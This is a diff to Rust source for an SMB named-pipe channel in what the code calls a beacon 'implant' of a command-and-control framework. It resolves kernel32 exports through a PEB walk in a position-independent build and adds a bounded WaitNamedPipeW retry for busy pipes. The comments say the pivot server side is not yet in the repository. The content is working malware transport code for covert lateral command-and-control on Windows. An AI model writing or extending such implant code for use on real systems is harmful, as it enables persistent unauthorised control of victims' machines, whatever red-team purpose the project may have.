@@ -22,12 +22,34 @@
 //! resolves WinHTTP. `kernel32.dll` is always resident (the process loader maps
 //! it before any user code runs), so no `LoadLibraryA` is needed.
 //!
-//! ## Synchronous I/O
+//! ## NotImplemented status (implant-channels-2/3)
+//! The parent side (pipe server on the team server / parent implant) does NOT
+//! exist in this repo yet, so a beacon selected onto
+//! [`super::Channel::SmbPipe`] can never transact end-to-end. The dispatcher and `SetChannel` gate this
+//! channel as not implemented (`Response::Err` on select, `None` +
+//! `ERR_CH_NOT_IMPL` on dispatch). The client-side code below stays live and
+//! bounded so the channel is ready to flip on when the pivot side lands.
+//!
+//! ## Synchronous I/O + bounded-blocking contract
 //!
 //! `CreateFileW` is called with no `FILE_FLAG_OVERLAPPED`, so `WriteFile`/
 //! `ReadFile` block until the server side completes. This matches the reference
 //! transport's synchronous mode and avoids the OVERLAPPED-event complexity that
 //! would be unsafe under a bump allocator with no Drop glue for handles.
+//!
+//! The blocking is BOUNDED as follows (implant-channels-3):
+//! - *Connect phase* — a missing pipe fails immediately (dead peer); a busy
+//!   pipe (`ERROR_PIPE_BUSY`) waits at most [`PIPE_WAIT_MS`] via
+//!   `WaitNamedPipeW` and retries once, then fails. A wedged server cannot
+//!   hold the beacon thread here.
+//! - *I/O phase* — `WriteFile`/`ReadFile` block for as long as the pipe server
+//!   stalls consuming/producing bytes (bounded only by the server, since
+//!   synchronous pipe I/O has no kernel timeout). Mitigations: each call opens,
+//!   transacts, and closes the pipe (stateless — no reconnect bookkeeping, a
+//!   wedged peer costs at most one cycle), and the beacon loop's own cadence
+//!   bounds total impact. Fully-bounded I/O would require OVERLAPPED
+//!   + `WaitForSingleObject` with a deadline, which is deliberately out of
+//!   scope for this PIC build (no handle RAII under the bump allocator).
 
 #![cfg(target_os = "windows")]
 
@@ -46,10 +68,13 @@ const GENERIC_WRITE: u32 = 0x4000_0000;
 const OPEN_EXISTING: u32 = 3;
 /// `INVALID_HANDLE_VALUE` as a raw pointer. CreateFileW returns this on failure.
 const INVALID_HANDLE: *mut c_void = !0usize as *mut c_void;
-/// Pipe not-available transient error (server still spawning the instance).
-/// The client treats this as a soft failure (return None → beacon retry).
-#[allow(dead_code)]
+/// Pipe exists but every instance is connected to a server that hasn't
+/// accepted yet. The client bounds this case with [`WaitNamedPipeW`]
+/// (implant-channels-3) instead of giving up instantly or spinning forever.
 const ERROR_PIPE_BUSY: u32 = 231;
+/// `WaitNamedPipeW` timeout (ms) for a busy pipe. Bounds the connect phase so
+/// a wedged pipe server can't hold the single beacon thread indefinitely.
+const PIPE_WAIT_MS: u32 = 5_000;
 
 /// Maximum total frame size (payload) the channel will accept on read. Caps the
 /// bump-allocator pressure a malicious/buggy pipe server can impose by sending a
@@ -87,6 +112,10 @@ type FReadFile = unsafe extern "system" fn(
 ) -> i32;
 
 type FCloseHandle = unsafe extern "system" fn(h_object: Handle) -> i32;
+/// `BOOL WaitNamedPipeW(LPCWSTR lpNamedPipeName, DWORD nTimeOut)`.
+type FWaitNamedPipeW = unsafe extern "system" fn(*const u16, u32) -> i32;
+/// `DWORD GetLastError(void)`.
+type FGetLastError = unsafe extern "system" fn() -> u32;
 
 /// Resolved kernel32 function table (cached after first resolution).
 struct K32Fns {
@@ -94,6 +123,8 @@ struct K32Fns {
     write_file: FWriteFile,
     read_file: FReadFile,
     close_handle: FCloseHandle,
+    wait_named_pipe_w: FWaitNamedPipeW,
+    get_last_error: FGetLastError,
 }
 
 /// kernel32 function table, stored as a raw pointer. 0 = uninitialized,
@@ -114,7 +145,14 @@ unsafe fn ensure_k32() -> bool {
     let wf = export_addr(b"kernel32.dll", b"WriteFile");
     let rf = export_addr(b"kernel32.dll", b"ReadFile");
     let ch = export_addr(b"kernel32.dll", b"CloseHandle");
-    if let (Some(cf), Some(wf), Some(rf), Some(ch)) = (cf, wf, rf, ch) {
+    // Bounded pipe-open (implant-channels-3): WaitNamedPipeW bounds the busy-
+    // pipe connect phase; GetLastError identifies ERROR_PIPE_BUSY vs. a
+    // missing pipe (which should fail fast, not wait).
+    let wnpw = export_addr(b"kernel32.dll", b"WaitNamedPipeW");
+    let gle = export_addr(b"kernel32.dll", b"GetLastError");
+    if let (Some(cf), Some(wf), Some(rf), Some(ch), Some(wnpw), Some(gle)) =
+        (cf, wf, rf, ch, wnpw, gle)
+    {
         // SAFETY: function pointer transmute. The PEB-walk export resolution
         // returns the absolute address of the named export; transmuting to the
         // matching `extern "system"` signature is sound because the Win32 ABI
@@ -124,6 +162,8 @@ unsafe fn ensure_k32() -> bool {
             write_file: core::mem::transmute(wf),
             read_file: core::mem::transmute(rf),
             close_handle: core::mem::transmute(ch),
+            wait_named_pipe_w: core::mem::transmute(wnpw),
+            get_last_error: core::mem::transmute(gle),
         });
         let ptr = alloc::boxed::Box::into_raw(fns) as usize;
         match K32.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
@@ -185,9 +225,14 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     let fns = unsafe { &*(ptr as *const K32Fns) };
     let close = fns.close_handle;
 
-    // ---- Open the named pipe ----
+    // ---- Open the named pipe (bounded: WaitNamedPipeW on ERROR_PIPE_BUSY) ----
+    // Connect phase deadline contract (implant-channels-3):
+    //  - pipe missing (ERROR_FILE_NOT_FOUND) → fail fast (dead peer);
+    //  - pipe busy (ERROR_PIPE_BUSY, server hasn't accepted yet) → wait up to
+    //    PIPE_WAIT_MS via WaitNamedPipeW, retry once, then give up. A wedged
+    //    pipe server can no longer hold the single beacon thread indefinitely.
     let wide = to_utf16(ctx.smb_pipe_name.as_bytes());
-    let handle = unsafe {
+    let mut handle = unsafe {
         (fns.create_file_w)(
             wide.as_ptr(),
             GENERIC_READ | GENERIC_WRITE,
@@ -198,9 +243,27 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
             core::ptr::null_mut(),
         )
     };
+    if (handle == INVALID_HANDLE || handle.is_null())
+        && (fns.get_last_error)() == ERROR_PIPE_BUSY
+    {
+        // Instance busy — wait (bounded) for the server to accept, then retry.
+        let _ = (fns.wait_named_pipe_w)(wide.as_ptr(), PIPE_WAIT_MS);
+        handle = unsafe {
+            (fns.create_file_w)(
+                wide.as_ptr(),
+                GENERIC_READ | GENERIC_WRITE,
+                0,
+                core::ptr::null(),
+                OPEN_EXISTING,
+                0,
+                core::ptr::null_mut(),
+            )
+        };
+    }
     if handle == INVALID_HANDLE || handle.is_null() {
-        // Pipe not present / not listening yet → transient: the beacon loop will
-        // retry next cycle. (Common during pivot bring-up.)
+        // Pipe not present / not listening yet / still busy after the wait →
+        // transient: the beacon loop will retry next cycle. (Common during
+        // pivot bring-up.)
         crate::entry::diag_mark(b"ERR_CH_SMB_OPEN");
         return None;
     }
